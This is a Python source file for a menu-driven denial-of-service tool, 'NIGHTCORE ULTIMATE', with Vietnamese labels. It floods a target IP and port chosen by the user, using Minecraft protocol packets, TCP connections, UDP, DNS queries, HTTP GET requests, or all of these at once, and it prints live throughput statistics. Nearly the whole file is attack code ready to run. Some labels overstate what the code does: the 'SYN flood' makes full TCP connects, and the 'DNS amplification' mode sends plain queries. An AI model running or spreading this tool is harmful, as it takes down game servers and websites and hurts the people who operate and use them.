import os
import socket
import threading
import time
import struct
import sys
import random

# ===================== CẤU HÌNH TẤN CÔNG =======================
PACKET_PER_CONN = 500000 
STATS_INTERVAL = 0.5 
DATA_PER_PACKET = 300000
total_sent = 0 
total_packets = 0
total_connections = 0
lock = threading.Lock()

# ===================== MÀU SẮC NIGHTCORE GRADIENT ========================
C1 = "\033[38;2;0;100;255m"   # Xanh nước biển sáng
C2 = "\033[38;2;0;70;200m"    # Xanh đậm
C3 = "\033[38;2;0;40;130m"    # Xanh rất đậm
C4 = "\033[38;2;0;15;60m"     # Xanh gần đen
C5 = "\033[38;2;0;5;20m"      # Đen xanh
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"

# ===================== GIAO DIỆN CHÍNH ========================
def startup():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    menu()

def logo():
    print(f"""
{C1}███╗  ██╗{C2}██╗{C3} ██████╗ {C4}██╗  ██╗{C5}████████╗{C1} ██████╗ {C2} ██████╗ {C3}██████╗ {C4}███████╗
{C1}████╗ ██║{C2}██║{C3}██╔════╝ {C4}██║  ██║{C5}╚══██╔══╝{C1}██╔════╝ {C2}██╔═══██╗{C3}██╔══██╗{C4}██╔════╝
{C1}██╔██╗██║{C2}██║{C3}██║  ███╗{C4}███████║{C5}   ██║   {C1}██║      {C2}██║   ██║{C3}██████╔╝{C4}█████╗  
{C1}██║╚████║{C2}██║{C3}██║   ██║{C4}██╔══██║{C5}   ██║   {C1}██║      {C2}██║   ██║{C3}██╔══██╗{C4}██╔══╝  
{C1}██║ ╚███║{C2}██║{C3}╚██████╔╝{C4}██║  ██║{C5}   ██║   {C1}╚██████╗ {C2}╚██████╔╝{C3}██║  ██║{C4}███████╗
{C1}╚═╝  ╚══╝{C2}╚═╝{C3} ╚═════╝ {C4}╚═╝  ╚═╝{C5}   ╚═╝   {C1} ╚═════╝ {C2} ╚═════╝ {C3}╚═╝  ╚═╝{C4}╚══════╝

                {C2}HỆ THỐNG NIGHTCORE ULTIMATE - TÁC GIẢ: QUANGLUU{RESET}
    """)

def menu():
    while True:
        print(f"{C1}╔" + "═"*62 + f"╗{RESET}")
        print(f"{C1}║{RESET}{WHITE}{' '*23}MENU CHÍNH{' '*23}{C1}║{RESET}")
        print(f"{C1}╠" + "═"*62 + f"╣{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[1]{RESET} {WHITE}MINECRAFT STRESS TEST (GỐC){' '*27}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[2]{RESET} {WHITE}MINECRAFT ULTIMATE (5 LOẠI PACKET){' '*19}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[3]{RESET} {WHITE}TCP SYN FLOOD (MẠNH){' '*34}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[4]{RESET} {WHITE}UDP FLOOD (MẠNH){' '*36}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[5]{RESET} {WHITE}DNS AMPLIFICATION{' '*35}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[6]{RESET} {WHITE}HTTP FLOOD{' '*40}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[7]{RESET} {WHITE}MIXED ATTACK (TẤT CẢ CÙNG LÚC){' '*24}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {GREEN}[8]{RESET} {WHITE}THÔNG TIN{' '*42}{C1}║{RESET}")
        print(f"{C1}║{RESET}  {RED}[0]{RESET} {WHITE}THOÁT{' '*49}{C1}║{RESET}")
        print(f"{C1}╚" + "═"*62 + f"╝{RESET}")
        
        choice = input(f"\n{C1}NIGHTCORE >> {RESET}").strip()

        if choice == '1':
            attack_minecraft_goc()
        elif choice == '2':
            attack_minecraft_ultimate()
        elif choice == '3':
            syn_flood()
        elif choice == '4':
            udp_flood()
        elif choice == '5':
            dns_amplification()
        elif choice == '6':
            http_flood()
        elif choice == '7':
            mixed_attack()
        elif choice == '8':
            show_info()
        elif choice == '0':
            print(f"{RED}Đang thoát...{RESET}")
            sys.exit()
        else:
            print(f"{RED}Lựa chọn không hợp lệ!{RESET}")

def show_info():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"""
{CYAN}╔══════════════════════════════════════════════════════════════╗
║  {WHITE}THÔNG TIN NIGHTCORE ULTIMATE{CYAN}                                 ║
╠══════════════════════════════════════════════════════════════╣
║  {GREEN}Tác giả:{WHITE} QUANGLUU{CYAN}                                          ║
║  {GREEN}Phiên bản:{WHITE} 3.0{CYAN}                                              ║
║  {GREEN}Màu sắc:{WHITE} Gradient Xanh dương - Đen{CYAN}                         ║
╠══════════════════════════════════════════════════════════════╣
║  {YELLOW}TÍNH NĂNG:{CYAN}                                                     ║
║  {WHITE}• Minecraft Stress Test (gốc){CYAN}                                   ║
║  {WHITE}• Minecraft Ultimate với 5 loại packet{CYAN}                          ║
║  {WHITE}• TCP SYN Flood{CYAN}                                                 ║
║  {WHITE}• UDP Flood{CYAN}                                                     ║
║  {WHITE}• DNS Amplification{CYAN}                                             ║
║  {WHITE}• HTTP Flood{CYAN}                                                    ║
║  {WHITE}• Mixed Attack{CYAN}                                                  ║
╚══════════════════════════════════════════════════════════════╝
    {RESET}""")
    input(f"\n{C1}Nhấn Enter để quay lại menu...{RESET}")
    startup()

# ===================== MINECRAFT GỐC (GIỮ NGUYÊN) =======================
def build_fake_packet(ip, port):
    ip_bytes = ip.encode()
    packet = b'\x00' + b'\x04' + struct.pack('>B', len(ip_bytes)) + ip_bytes + struct.pack('>H', port) + b'\x01'
    handshake = struct.pack('>B', len(packet)) + packet
    return handshake + b'\x01\x00' + b'\x00' * (DATA_PER_PACKET - len(handshake + b'\x01\x00'))

def sender_goc(ip, port):
    global total_sent, total_packets, total_connections
    packet = build_fake_packet(ip, port)
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.connect((ip, port))
                with lock:
                    total_connections += 1
                for _ in range(PACKET_PER_CONN):
                    s.sendall(packet)
                    with lock: 
                        total_sent += len(packet)
                        total_packets += 1
        except: 
            continue

def attack_minecraft_goc():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}              MINECRAFT STRESS TEST (PHIÊN BẢN GỐC){CYAN}           ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Server: {RESET}").strip()
    port = int(input(f"{GREEN}Port: {RESET}").strip())
    threads = int(input(f"{GREEN}Số luồng: {RESET}").strip())

    print(f"\n{C2}>>> ĐANG GIẢI PHÓNG DÒNG CHẢY NIGHTCORE...{RESET}\n")
    threading.Thread(target=stats_printer, args=("GỐC",), daemon=True).start()
    for _ in range(threads):
        threading.Thread(target=sender_goc, args=(ip, port), daemon=True).start()
    while True: 
        time.sleep(1)

# ===================== MINECRAFT ULTIMATE (5 LOẠI PACKET) =======================
def build_minecraft_packet(ip, port, loai):
    ip_bytes = ip.encode()
    
    if loai == 1:
        # Packet handshake cơ bản
        packet = b'\x00' + b'\x04' + struct.pack('>B', len(ip_bytes)) + ip_bytes + struct.pack('>H', port) + b'\x01'
        handshake = struct.pack('>B', len(packet)) + packet
        return handshake + b'\x01\x00' + random.randbytes(DATA_PER_PACKET - len(handshake + b'\x01\x00'))
    
    elif loai == 2:
        # Packet login
        username = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=16))
        packet = b'\x00' + username.encode() + b'\x00' * 100
        return packet + random.randbytes(DATA_PER_PACKET - len(packet))
    
    elif loai == 3:
        # Packet chat
        message = f"Hello {random.randint(1,1000)}".encode()
        packet = b'\x02' + struct.pack('>H', len(message)) + message
        return packet + random.randbytes(DATA_PER_PACKET - len(packet))
    
    elif loai == 4:
        # Packet keep-alive
        packet = b'\x01' + struct.pack('>Q', int(time.time() * 1000))
        return packet + random.randbytes(DATA_PER_PACKET - len(packet))
    
    else:
        # Packet ping
        packet = b'\x01' + b'\x00' * 100
        return packet + random.randbytes(DATA_PER_PACKET - len(packet))

def sender_ultimate(ip, port, loai):
    global total_sent, total_packets, total_connections
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(3)
                s.connect((ip, port))
                with lock:
                    total_connections += 1
                
                for i in range(PACKET_PER_CONN // 10):  # Giảm để tránh treo
                    packet = build_minecraft_packet(ip, port, loai)
                    s.sendall(packet)
                    with lock: 
                        total_sent += len(packet)
                        total_packets += 1
        except: 
            continue

def attack_minecraft_ultimate():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}              MINECRAFT ULTIMATE (5 LOẠI PACKET){CYAN}              ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Server: {RESET}").strip()
    port = int(input(f"{GREEN}Port: {RESET}").strip())
    
    print(f"\n{WHITE}Chọn loại tấn công:{RESET}")
    print(f"  {CYAN}[1]{RESET} Handshake Flood")
    print(f"  {CYAN}[2]{RESET} Login Flood")
    print(f"  {CYAN}[3]{RESET} Chat Flood")
    print(f"  {CYAN}[4]{RESET} Keep-Alive Flood")
    print(f"  {CYAN}[5]{RESET} Ping Flood")
    print(f"  {CYAN}[6]{RESET} Mixed (Tất cả các loại)")
    
    loai = int(input(f"\n{GREEN}Lựa chọn (1-6): {RESET}").strip() or "6")
    threads = int(input(f"{GREEN}Số luồng: {RESET}").strip() or "500")

    print(f"\n{C2}>>> ĐANG TẤN CÔNG MINECRAFT ULTIMATE...{RESET}\n")
    threading.Thread(target=stats_printer, args=("MC-U",), daemon=True).start()
    
    if loai == 6:
        # Mixed: mỗi luồng một loại packet
        for i in range(threads):
            loai_packet = (i % 5) + 1
            threading.Thread(target=sender_ultimate, args=(ip, port, loai_packet), daemon=True).start()
    else:
        for _ in range(threads):
            threading.Thread(target=sender_ultimate, args=(ip, port, loai), daemon=True).start()
    
    while True: 
        time.sleep(1)

# ===================== TCP SYN FLOOD =======================
def syn_flood():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}                     TCP SYN FLOOD{CYAN}                           ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Mục tiêu: {RESET}").strip()
    port = int(input(f"{GREEN}Port: {RESET}").strip())
    threads = int(input(f"{GREEN}Số luồng: {RESET}").strip() or "500")

    def syn_sender():
        global total_sent, total_packets
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((ip, port))
                    s.send(random.randbytes(100))
                    with lock:
                        total_sent += 100
                        total_packets += 1
            except:
                continue

    print(f"\n{YELLOW}[+] Bắt đầu SYN flood...{RESET}\n")
    threading.Thread(target=stats_printer, args=("SYN",), daemon=True).start()
    
    for _ in range(threads):
        threading.Thread(target=syn_sender, daemon=True).start()
    
    while True: 
        time.sleep(1)

# ===================== UDP FLOOD =======================
def udp_flood():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}                       UDP FLOOD{CYAN}                            ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Mục tiêu: {RESET}").strip()
    port = int(input(f"{GREEN}Port: {RESET}").strip())
    threads = int(input(f"{GREEN}Số luồng: {RESET}").strip() or "500")

    def udp_sender():
        global total_sent, total_packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random.randbytes(1024)
        while True:
            try:
                sock.sendto(data, (ip, port))
                with lock:
                    total_sent += len(data)
                    total_packets += 1
            except:
                continue

    print(f"\n{YELLOW}[+] Bắt đầu UDP flood...{RESET}\n")
    threading.Thread(target=stats_printer, args=("UDP",), daemon=True).start()
    
    for _ in range(threads):
        threading.Thread(target=udp_sender, daemon=True).start()
    
    while True: 
        time.sleep(1)

# ===================== DNS AMPLIFICATION =======================
def dns_amplification():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}                   DNS AMPLIFICATION{CYAN}                        ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Mục tiêu: {RESET}").strip()
    port = int(input(f"{GREEN}Port DNS (53): {RESET}").strip() or "53")
    threads = int(input(f"{GREEN}Số luồng: {RESET}").strip() or "500")

    def dns_sender():
        global total_sent, total_packets
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                # DNS query đơn giản
                transaction_id = random.randint(0, 65535)
                flags = 0x0100
                questions = 0x0001
                header = struct.pack('>HHHHHH', transaction_id, flags, questions, 0, 0, 0)
                
                # Tên miền ngẫu nhiên
                domain = f"example{random.randint(1,9999)}.com"
                question = struct.pack('B', len(domain)) + domain.encode() + b'\x00\x01\x00\x01'
                
                packet = header + question
                sock.sendto(packet, (ip, port))
                
                with lock:
                    total_sent += len(packet)
                    total_packets += 1
            except:
                continue

    print(f"\n{YELLOW}[+] Bắt đầu DNS amplification...{RESET}\n")
    threading.Thread(target=stats_printer, args=("DNS",), daemon=True).start()
    
    for _ in range(threads):
        threading.Thread(target=dns_sender, daemon=True).start()
    
    while True: 
        time.sleep(1)

# ===================== HTTP FLOOD =======================
def http_flood():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}                      HTTP FLOOD{CYAN}                            ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Web Server: {RESET}").strip()
    port = int(input(f"{GREEN}Port (80/443): {RESET}").strip() or "80")
    threads = int(input(f"{GREEN}Số luồng: {RESET}").strip() or "500")

    def http_sender():
        global total_sent, total_packets
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((ip, port))
                    
                    # Gửi HTTP request
                    request = f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                    s.send(request.encode())
                    
                    with lock:
                        total_sent += len(request)
                        total_packets += 1
            except:
                continue

    print(f"\n{YELLOW}[+] Bắt đầu HTTP flood...{RESET}\n")
    threading.Thread(target=stats_printer, args=("HTTP",), daemon=True).start()
    
    for _ in range(threads):
        threading.Thread(target=http_sender, daemon=True).start()
    
    while True: 
        time.sleep(1)

# ===================== MIXED ATTACK =======================
def mixed_attack():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    print(f"{PURPLE}╔══════════════════════════════════════════════════════════════╗")
    print(f"║{WHITE}                    MIXED ATTACK (ALL IN ONE){PURPLE}                ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RESET}\n")
    
    ip = input(f"{GREEN}IP Mục tiêu: {RESET}").strip()
    port = int(input(f"{GREEN}Port: {RESET}").strip())
    threads = int(input(f"{GREEN}Số luồng mỗi loại: {RESET}").strip() or "100")

    print(f"\n{YELLOW}[+] Bắt đầu Mixed Attack với {threads*5} luồng...{RESET}\n")
    threading.Thread(target=stats_printer, args=("MIX",), daemon=True).start()
    
    # Khởi động tất cả các loại tấn công
    for _ in range(threads):
        threading.Thread(target=syn_flood_worker, args=(ip, port), daemon=True).start()
        threading.Thread(target=udp_flood_worker, args=(ip, port), daemon=True).start()
        threading.Thread(target=dns_flood_worker, args=(ip, port), daemon=True).start()
        threading.Thread(target=http_flood_worker, args=(ip, port), daemon=True).start()
        threading.Thread(target=minecraft_worker, args=(ip, port), daemon=True).start()
    
    while True: 
        time.sleep(1)

# Các worker cho mixed attack
def syn_flood_worker(ip, port):
    global total_sent, total_packets
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                s.send(random.randbytes(100))
                with lock:
                    total_sent += 100
                    total_packets += 1
        except:
            continue

def udp_flood_worker(ip, port):
    global total_sent, total_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random.randbytes(512)
    while True:
        try:
            sock.sendto(data, (ip, port))
            with lock:
                total_sent += len(data)
                total_packets += 1
        except:
            continue

def dns_flood_worker(ip, port):
    global total_sent, total_packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            header = struct.pack('>HHHHHH', random.randint(0,65535), 0x0100, 0x0001, 0, 0, 0)
            domain = f"test{random.randint(1,999)}.com"
            question = struct.pack('B', len(domain)) + domain.encode() + b'\x00\x01\x00\x01'
            packet = header + question
            sock.sendto(packet, (ip, port))
            with lock:
                total_sent += len(packet)
                total_packets += 1
        except:
            continue

def http_flood_worker(ip, port):
    global total_sent, total_packets
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                request = f"GET /{random.randint(1,999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n"
                s.send(request.encode())
                with lock:
                    total_sent += len(request)
                    total_packets += 1
        except:
            continue

def minecraft_worker(ip, port):
    global total_sent, total_packets
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                s.connect((ip, port))
                packet = b'\x00\x04' + struct.pack('>B', len(ip)) + ip.encode() + struct.pack('>H', port) + b'\x01'
                s.send(packet + random.randbytes(100))
                with lock:
                    total_sent += len(packet) + 100
                    total_packets += 1
        except:
            continue

# ===================== STATS PRINTER =======================
def stats_printer(loai):
    global total_sent, total_packets, total_connections
    prev_bytes = 0
    prev_packets = 0
    prev_time = time.time()
    
    while True:
        time.sleep(STATS_INTERVAL)
        with lock: 
            current_bytes = total_sent
            current_packets = total_packets
            current_conn = total_connections
        
        current_time = time.time()
        elapsed = current_time - prev_time
        
        if elapsed > 0:
            bytes_delta = current_bytes - prev_bytes
            packets_delta = current_packets - prev_packets
            
            mbps = (bytes_delta * 8) / (1024**2) / elapsed
            pps = packets_delta / elapsed
            total_mb = current_bytes / (1024**2)
            total_gb = current_bytes / (1024**3)
            
            print(f"{C1}[{loai}] {WHITE}{time.strftime('%H:%M:%S')} | "
                  f"{GREEN}Tốc độ: {mbps:.2f} Mbps | "
                  f"{CYAN}PPS: {pps:.0f} | "
                  f"{YELLOW}MB: {total_mb:.2f} | "
                  f"{PURPLE}GB: {total_gb:.2f} | "
                  f"{BLUE}Kết nối: {current_conn}{RESET}")
            
            prev_bytes = current_bytes
            prev_packets = current_packets
            prev_time = current_time

# ===================== MAIN =======================
if __name__ == '__main__':
    try:
        startup()
    except KeyboardInterrupt:
        print(f"\n{RED}Đang thoát...{RESET}")
        sys.exit()
    except Exception as e:
        print(f"{RED}Lỗi: {e}{RESET}")
        sys.exit(1)